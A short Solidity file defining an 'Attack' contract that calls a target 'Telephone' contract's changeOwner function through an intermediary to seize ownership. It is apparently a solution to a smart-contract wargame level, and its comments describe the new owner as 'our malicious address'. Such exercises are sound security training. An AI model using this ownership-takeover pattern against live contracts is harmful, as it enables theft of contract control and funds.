// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// importing the Telephone contract so we can use its functions
import "./Telephone.sol";

contract Attack {
    // Creating an instance of the contract
    Telephone Tel;
    // Constructor takes an address as argument and passes it to the instance.
    // the instance then takes the malicious address se we can access the Telephone Contract's functions.
    constructor(address _Add)  {
        Tel = Telephone(_Add);
    }
    // changing the owner address to our malicious address.
    function changeowner(address _Add) public {
        Tel.changeOwner(_Add);
    }
}
